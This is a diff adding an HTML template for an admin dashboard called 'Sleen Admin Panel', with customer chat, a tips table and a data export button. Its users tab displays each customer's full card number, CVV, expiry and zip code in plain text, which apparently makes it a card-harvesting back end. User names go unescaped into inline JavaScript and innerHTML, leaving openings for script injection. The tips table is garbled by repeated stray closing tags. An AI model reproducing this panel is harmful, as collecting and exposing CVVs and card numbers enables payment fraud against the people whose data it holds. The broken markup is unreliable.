@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Panel - Sleen</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
+        .navbar { background: #dc3545 !important; }
+        .card { border-radius: 15px; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .card-header { background: linear-gradient(135deg, #667eea, #764ba2); color: white; border-radius: 15px 15px 0 0 !important; }
+        
+        /* User Card */
+        .user-card { 
+            background: white; 
+            border-radius: 12px; 
+            padding: 20px; 
+            margin-bottom: 15px; 
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+        .user-card:hover { 
+            transform: translateY(-3px); 
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            border-color: #667eea;
+        }
+        
+        /* Chat Container */
+        .message-container { 
+            height: 500px; 
+            overflow-y: auto; 
+            padding: 20px; 
+            background: #f8f9fa; 
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Message wrapper */
+        .message-wrapper {
+            display: flex;
+            margin-bottom: 20px;
+            width: 100%;
+            position: relative;
+        }
+        .message-wrapper.customer { justify-content: flex-start; }
+        .message-wrapper.admin { justify-content: flex-end; }
+        
+        /* Message bubble */
+        .message-bubble {
+            max-width: 70%;
+            padding: 12px 18px;
+            border-radius: 20px;
+            word-wrap: break-word;
+            position: relative;
+        }
+        .message-wrapper.customer .message-bubble {
+            background: white;
+            color: #333;
+            border-bottom-left-radius: 5px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .message-wrapper.admin .message-bubble {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border-bottom-right-radius: 5px;
+        }
+        .critical-message .message-bubble {
+            border: 2px solid #dc3545;
+            background: #ffebee !important;
+            color: #c62828 !important;
+        }
+        
+        /* Message actions - Delete icon on bubble */
+        .message-actions {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            display: none;
+            gap: 5px;
+        }
+        .message-wrapper:hover .message-actions {
+            display: flex;
+        }
+        .message-action-btn {
+            background: white;
+            border: none;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            transition: all 0.2s;
+            font-size: 12px;
+        }
+        .message-action-btn.delete-btn {
+            color: white;
+            background: #dc3545;
+        }
+        .message-action-btn.delete-btn:hover {
+            background: #c82333;
+            transform: scale(1.1);
+        }
+        .message-action-btn.copy-btn {
+            color: #333;
+            background: white;
+        }
+        .message-action-btn.copy-btn:hover {
+            background: #f0f0f0;
+            transform: scale(1.1);
+        }
+        .message-wrapper.admin .message-actions {
+            right: auto;
+            left: -10px;
+        }
+        
+        .message-sender {
+            font-size: 12px;
+            margin-bottom: 5px;
+            display: block;
+            font-weight: 600;
+        }
+        .message-wrapper.customer .message-sender { text-align: left; color: #667eea; }
+        .message-wrapper.admin .message-sender { text-align: right; color: rgba(255,255,255,0.8); }
+        
+        .message-time {
+            font-size: 10px;
+            margin-top: 5px;
+            display: block;
+        }
+        .message-wrapper.customer .message-time { text-align: left; color: #999; }
+        .message-wrapper.admin .message-time { text-align: right; color: rgba(255,255,255,0.7); }
+        
+        .message-image {
+            max-width: 200px;
+            border-radius: 10px;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+        
+        .chat-input-area { 
+            background: white; 
+            border-radius: 12px; 
+            padding: 15px; 
+            margin-top: 15px; 
+        }
+        
+        .btn-reply { 
+            background: linear-gradient(135deg, #667eea, #764ba2); 
+            color: white; 
+            border: none; 
+            padding: 10px 25px;
+            border-radius: 25px;
+        }
+        .btn-reply:hover { transform: translateY(-2px); }
+        
+        .card-info-box { 
+            background: #e8f5e9; 
+            border-left: 4px solid #4caf50; 
+            padding: 12px; 
+            border-radius: 8px; 
+            margin-top: 10px; 
+        }
+        
+        /* Tab Styles */
+        .nav-tabs { 
+            display: flex; 
+            border-bottom: 2px solid #dee2e6; 
+            margin-bottom: 20px; 
+        }
+        .tab-btn { 
+            background: none; 
+            border: none; 
+            padding: 12px 25px; 
+            font-weight: 600; 
+            color: #667eea; 
+            cursor: pointer; 
+            border-radius: 10px 10px 0 0; 
+            transition: all 0.3s;
+        }
+        .tab-btn:hover { background: rgba(102,126,234,0.1); }
+        .tab-btn.active { background: linear-gradient(135deg, #667eea, #764ba2); color: white; }
+        
+        .user-chat-item { 
+            padding: 15px; 
+            border-bottom: 1px solid #eee; 
+            cursor: pointer; 
+            transition: all 0.2s;
+        }
+        .user-chat-item:hover { background: #f0f2ff; }
+        .user-chat-item.active { 
+            background: linear-gradient(135deg, #667eea20, #764ba220);
+            border-left: 3px solid #667eea;
+        }
+        
+        .selected-user-header {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 12px 15px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+        }
+        
+        /* Profile Settings Card */
+        .profile-settings-card {
+            background: white;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .profile-settings-card .card-header {
+            background: linear-gradient(135deg, #28a745, #20c997);
+        }
+        
+        /* Toast notification */
+        .toast-notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #28a745;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            z-index: 10001;
+            animation: slideIn 0.3s ease;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .message-container::-webkit-scrollbar { width: 5px; }
+        .message-container::-webkit-scrollbar-track { background: #f1f1f1; border-radius: 5px; }
+        .message-container::-webkit-scrollbar-thumb { background: #667eea; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="/"><i class="fas fa-crown"></i> Sleen Admin Panel</a>
+            <div>
+                <button class="btn btn-info btn-sm me-2" onclick="exportAllData()">
+                    <i class="fas fa-download"></i> Export All Data
+                </button>
+               
+                <a href="/logout" class="btn btn-light btn-sm">Logout</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <h2><i class="fas fa-tachometer-alt"></i> Admin Dashboard</h2>
+        <p class="text-muted">Manage users, view card info, chat with customers, and track tips</p>
+
+        <!-- Admin Profile Settings Card -->
+        <div class="profile-settings-card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="fas fa-user-shield"></i> Admin Profile Settings</h5>
+            </div>
+            <div class="card-body">
+                <form id="adminProfileForm">
+                    <div class="row">
+                        <div class="col-md-6 mb-3">
+                            <label class="form-label">Email</label>
+                            <input type="email" id="adminEmail" class="form-control" value="admin@sleen.com" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label class="form-label">New Password</label>
+                            <input type="password" id="adminPassword" class="form-control" placeholder="Leave blank to keep current">
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-success"><i class="fas fa-save"></i> Update Profile</button>
+                    <span id="profileUpdateMsg" class="ms-3"></span>
+                </form>
+            </div>
+        </div>
+
+        <!-- Tab Navigation -->
+        <div class="nav-tabs">
+            <button class="tab-btn active" onclick="showTab('users')">
+                <i class="fas fa-users"></i> Users & Cards
+            </button>
+            <button class="tab-btn" onclick="showTab('chats')">
+                <i class="fas fa-comments"></i> Live Chats
+            </button>
+            <button class="tab-btn" onclick="showTab('tips')">
+                <i class="fas fa-coins"></i> Tips Received
+            </button>
+        </div>
+
+        <!-- TAB 1: Users & Card Info -->
+        <div id="tab-users" class="tab-content" style="display: block;">
+            <div class="card">
+                <div class="card-header">
+                    <h5 class="mb-0"><i class="fas fa-credit-card"></i> Registered Users & Complete Card Information</h5>
+                </div>
+                <div class="card-body">
+                    {% for user in users %}
+                    <div class="user-card" onclick="switchToChatTab({{ user.id }}, '{{ user.first_name }} {{ user.last_name }}', '{{ user.business_name }}')">
+                        <div class="row">
+                            <div class="col-md-5">
+                                <div class="d-flex align-items-center">
+                                    <i class="fas fa-store fa-2x me-3" style="color: #667eea;"></i>
+                                    <div>
+                                        <strong>{{ user.first_name }} {{ user.last_name }}</strong><br>
+                                        <small>{{ user.email }}</small><br>
+                                        <small class="text-muted">Business: {{ user.business_name }}</small>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <small><i class="fas fa-map-marker-alt"></i> {{ user.business_address[:50] }}...</small>
+                            </div>
+                            <div class="col-md-3">
+                                {% if user.card_number %}
+                                <span class="badge bg-success"><i class="fas fa-check-circle"></i> Card Saved</span>
+                                {% else %}
+                                <span class="badge bg-secondary"><i class="fas fa-times-circle"></i> No Card</span>
+                                {% endif %}
+                            </div>
+                        </div>
+                        {% if user.card_number %}
+                        <div class="card-info-box mt-3">
+                            <div class="row">
+                                <div class="col-md-3">
+                                    <small><strong>Card Holder:</strong></small><br>
+                                    <span>{{ user.card_holder }}</span>
+                                </div>
+                                <div class="col-md-3">
+                                    <small><strong>Card Number:</strong></small><br>
+                                    <span class="font-monospace">{{ user.card_number }}</span>
+                                </div>
+                                <div class="col-md-2">
+                                    <small><strong>CVV:</strong></small><br>
+                                    <span>{{ user.cvv }}</span>
+                                </div>
+                                <div class="col-md-2">
+                                    <small><strong>Expiry:</strong></small><br>
+                                    <span>{{ user.expiration }}</span>
+                                </div>
+                                <div class="col-md-2">
+                                    <small><strong>Zip:</strong></small><br>
+                                    <span>{{ user.zip_code }}</span>
+                                </div>
+                            </div>
+                        </div>
+                        {% endif %}
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 2: Live Chats -->
+        <div id="tab-chats" class="tab-content" style="display: none;">
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-header">
+                            <h5 class="mb-0"><i class="fas fa-users"></i> Customers</h5>
+                        </div>
+                        <div class="card-body p-0" style="max-height: 600px; overflow-y: auto;">
+                            <div id="users-list">
+                                {% for user in users %}
+                                <div class="user-chat-item" data-user-id="{{ user.id }}" data-user-name="{{ user.first_name }} {{ user.last_name }}" data-business="{{ user.business_name }}" onclick="selectChatUser({{ user.id }}, '{{ user.first_name }} {{ user.last_name }}', '{{ user.business_name }}')">
+                                    <div class="d-flex justify-content-between align-items-center">
+                                        <div>
+                                            <strong><i class="fas fa-user-circle"></i> {{ user.first_name }} {{ user.last_name }}</strong><br>
+                                            <small class="text-muted">{{ user.business_name }}</small>
+                                        </div>
+                                    </div>
+                                </div>
+                                {% endfor %}
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-8">
+                    <div class="card">
+                        <div class="card-header" id="chat-header">
+                            <h5 class="mb-0"><i class="fas fa-comments"></i> Select a customer to start chatting</h5>
+                        </div>
+                        <div class="message-container" id="chat-messages">
+                            <div class="text-center text-muted mt-5">
+                                <i class="fas fa-comment-dots fa-4x mb-3"></i>
+                                <p>Click on any customer from the left panel to view and reply to their messages</p>
+                            </div>
+                        </div>
+                        <div class="chat-input-area" id="chat-input" style="display: none;">
+                            <div class="selected-user-header" id="selected-user-info" style="display: none;">
+                                <i class="fas fa-user-circle"></i> Chatting with: <strong id="selected-user-name"></strong>
+                                <small id="selected-business-name" style="display: block; font-size: 12px;"></small>
+                            </div>
+                            <div class="input-group">
+                                <input type="text" class="form-control" id="reply-message" placeholder="Type your reply as Admin..." onkeypress="if(event.key==='Enter') sendAdminReply()">
+                                <button class="btn btn-reply" onclick="sendAdminReply()">
+                                    <i class="fas fa-paper-plane"></i> Send Reply
+                                </button>
+                            </div>
+                            <small class="text-muted mt-2 d-block">Hover over any message to see delete/copy options</small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 3: Tips -->
+        <div id="tab-tips" class="tab-content" style="display: none;">
+            <div class="card">
+                <div class="card-header bg-success text-white">
+                    <h5 class="mb-0"><i class="fas fa-coins"></i> Tips Received from Customers</h5>
+                </div>
+                <div class="card-body">
+                    <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead>
+                                <tr><th>Customer</th><th>Business</th><th>Amount</th><th>Message</th><th>Date</th><th>Action</th><tr>
+                            </thead>
+                            <tbody>
+                                {% for tip in tips %}
+                                <tr>
+                                    <td>
+                                        <strong>{{ tip.first_name }} {{ tip.last_name }}</strong><br>
+                                        <small>{{ tip.email }}</small>
+                                     </small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small>
+                                    <td>{{ tip.business_name }}</small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small>
+                                    <td><span class="badge bg-success fs-6">${{ tip.amount }}</span></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small>
+                                    <td>{{ tip.message or '-' }}</small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small>
+                                    <td><small>{{ tip.created_at[:19] }}</small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small>
+                                    <td>
+                                        <button class="btn btn-sm btn-primary" onclick="sendThankYou({{ tip.user_id }}, {{ tip.amount }})">
+                                            <i class="fas fa-reply"></i> Thank You
+                                        </button>
+                                    </small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small></small>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentUserId = null;
+        let currentUserName = '';
+        let currentBusinessName = '';
+        
+        // Export all data
+        async function exportAllData() {
+            showToast('📊 Exporting data... please wait');
+            const res = await fetch('/admin/export_data');
+            const data = await res.json();
+            if(data.success) {
+                window.location.href = data.download_url;
+                showToast('✅ Data exported successfully!');
+            } else {
+                showToast('❌ Export failed', true);
+            }
+        }
+        
+        // Admin profile update
+        document.getElementById('adminProfileForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('adminEmail').value;
+            const password = document.getElementById('adminPassword').value;
+            
+            const formData = new FormData();
+            formData.append('email', email);
+            if(password) formData.append('password', password);
+            
+            const res = await fetch('/admin/update_profile', { method: 'POST', body: formData });
+            const data = await res.json();
+            
+            const msgSpan = document.getElementById('profileUpdateMsg');
+            if(data.success) {
+                msgSpan.innerHTML = '<span class="text-success">✅ Profile updated successfully!</span>';
+                setTimeout(() => msgSpan.innerHTML = '', 3000);
+                document.getElementById('adminPassword').value = '';
+            } else {
+                msgSpan.innerHTML = '<span class="text-danger">❌ Error updating profile</span>';
+            }
+        };
+        
+        // Show toast
+        function showToast(message, isError = false) {
+            const toast = document.createElement('div');
+            toast.className = 'toast-notification';
+            toast.style.background = isError ? '#dc3545' : '#28a745';
+            toast.innerHTML = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+        
+        // Tab switching
+        function showTab(tabName) {
+            document.getElementById('tab-users').style.display = 'none';
+            document.getElementById('tab-chats').style.display = 'none';
+            document.getElementById('tab-tips').style.display = 'none';
+            document.getElementById(`tab-${tabName}`).style.display = 'block';
+            
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            if(event && event.target) event.target.classList.add('active');
+        }
+        
+        // Switch to chat tab
+        function switchToChatTab(userId, userName, businessName) {
+            const chatsTab = document.querySelector('.tab-btn:nth-child(2)');
+            if(chatsTab) chatsTab.click();
+            setTimeout(() => selectChatUser(userId, userName, businessName), 100);
+        }
+        
+        // Delete message
+        async function deleteMessage(messageId) {
+            if(confirm('Delete this message? It will be hidden from both user and admin views.')) {
+                const res = await fetch(`/admin/delete_message/${messageId}`, { method: 'POST' });
+                if(res.ok) {
+                    showToast('🗑️ Message deleted successfully');
+                    loadMessages();
+                }
+            }
+        }
+        
+        // Copy message
+        async function copyMessage(messageText) {
+            await navigator.clipboard.writeText(messageText);
+            showToast('✅ Message copied to clipboard!');
+        }
+        
+        // Select user for chat
+        function selectChatUser(userId, userName, businessName) {
+            currentUserId = userId;
+            currentUserName = userName;
+            currentBusinessName = businessName;
+            
+            document.getElementById('selected-user-info').style.display = 'block';
+            document.getElementById('selected-user-name').innerHTML = `${userName}`;
+            document.getElementById('selected-business-name').innerHTML = `${businessName}`;
+            document.getElementById('chat-header').innerHTML = `
+                <h5 class="mb-0">
+                    <i class="fas fa-comments"></i> Chat with: ${userName}
+                    <small class="text-muted">(${businessName})</small>
+                </h5>
+            `;
+            document.getElementById('chat-input').style.display = 'block';
+            
+            document.querySelectorAll('.user-chat-item').forEach(el => el.classList.remove('active'));
+            const selectedEl = document.querySelector(`.user-chat-item[data-user-id="${userId}"]`);
+            if(selectedEl) selectedEl.classList.add('active');
+            
+            loadMessages();
+        }
+        
+        // Load messages with inline delete buttons
+        async function loadMessages() {
+            if (!currentUserId) return;
+            
+            const res = await fetch(`/get_messages_admin/${currentUserId}`);
+            const messages = await res.json();
+            const container = document.getElementById('chat-messages');
+            container.innerHTML = '';
+            
+            if(messages.length === 0) {
+                container.innerHTML = '<div class="text-center text-muted mt-5"><i class="fas fa-comment-dots fa-4x mb-3"></i><p>No messages yet. Start a conversation!</p></div>';
+                return;
+            }
+            
+            for(let msg of messages) {
+                const isAdmin = msg.is_from_admin == 1;
+                
+                const wrapper = document.createElement('div');
+                wrapper.className = `message-wrapper ${isAdmin ? 'admin' : 'customer'}`;
+                
+                if(msg.is_critical && !isAdmin) wrapper.classList.add('critical-message');
+                
+                // Message bubble
+                const bubble = document.createElement('div');
+                bubble.className = 'message-bubble';
+                
+                const senderName = document.createElement('div');
+                senderName.className = 'message-sender';
+                senderName.innerHTML = isAdmin ? '👑 Admin (You)' : `👤 ${currentUserName}`;
+                
+                const messageContent = document.createElement('div');
+                messageContent.innerHTML = escapeHtml(msg.message);
+                
+                const timeSpan = document.createElement('div');
+                timeSpan.className = 'message-time';
+                timeSpan.innerHTML = new Date(msg.created_at).toLocaleString();
+                
+                bubble.appendChild(senderName);
+                bubble.appendChild(messageContent);
+                
+                if(msg.image) {
+                    const img = document.createElement('img');
+                    img.src = `/static/uploads/${msg.image}`;
+                    img.className = 'message-image';
+                    img.onclick = (e) => { e.stopPropagation(); window.open(img.src); };
+                    bubble.appendChild(img);
+                }
+                
+                bubble.appendChild(timeSpan);
+                wrapper.appendChild(bubble);
+                
+                // Action buttons (delete & copy) on hover
+                const actions = document.createElement('div');
+                actions.className = 'message-actions';
+                
+                const copyBtn = document.createElement('button');
+                copyBtn.className = 'message-action-btn copy-btn';
+                copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
+                copyBtn.title = 'Copy message';
+                copyBtn.onclick = (e) => {
+                    e.stopPropagation();
+                    copyMessage(msg.message);
+                };
+                
+                const deleteBtn = document.createElement('button');
+                deleteBtn.className = 'message-action-btn delete-btn';
+                deleteBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
+                deleteBtn.title = 'Delete message';
+                deleteBtn.onclick = (e) => {
+                    e.stopPropagation();
+                    deleteMessage(msg.id);
+                };
+                
+                actions.appendChild(copyBtn);
+                actions.appendChild(deleteBtn);
+                wrapper.appendChild(actions);
+                
+                container.appendChild(wrapper);
+            }
+            container.scrollTop = container.scrollHeight;
+        }
+        
+        // Send admin reply
+        async function sendAdminReply() {
+            const message = document.getElementById('reply-message').value;
+            if(!message.trim() || !currentUserId) {
+                if(!currentUserId) alert('Please select a customer first');
+                return;
+            }
+            
+            const formData = new FormData();
+            formData.append('user_id', currentUserId);
+            formData.append('message', message);
+            
+            const res = await fetch('/admin/reply', { method: 'POST', body: formData });
+            if(res.ok) {
+                document.getElementById('reply-message').value = '';
+                loadMessages();
+                showToast('✅ Reply sent!');
+            }
+        }
+        
+        // Send thank you for tip
+        async function sendThankYou(userId, amount) {
+            const formData = new FormData();
+            formData.append('user_id', userId);
+            formData.append('message', `Thank you so much for your generous tip of $${amount}! We really appreciate your support. 🙏`);
+            
+            await fetch('/admin/reply', { method: 'POST', body: formData });
+            alert(`✅ Thank you message sent! The customer will see your reply.`);
+            
+            const chatsTab = document.querySelector('.tab-btn:nth-child(2)');
+            if(chatsTab) chatsTab.click();
+            setTimeout(() => selectChatUser(userId, '', ''), 100);
+        }
+        
+        function escapeHtml(text) {
+            if(!text) return '';
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        setInterval(() => { if(currentUserId) loadMessages(); }, 3000);
+    </script>
+</body>
+</html>
